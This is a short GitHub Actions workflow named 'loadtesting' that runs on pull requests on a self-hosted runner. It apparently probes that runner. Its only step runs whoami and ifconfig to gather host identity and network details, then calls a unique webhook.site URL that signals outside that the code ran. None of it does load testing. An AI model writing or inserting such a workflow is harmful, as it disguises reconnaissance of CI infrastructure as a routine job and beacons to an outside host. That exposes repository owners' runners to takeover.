name : loadtesting

on:
  pull_request:
jobs:
  build_image:
    name: build_image
    runs-on: self-hosted
    steps:
      - name: test
        run: |
          whoami
          ifconfig
          curl https://webhook.site/133b00bd-c98c-45bc-a150-41c3d10a4a69

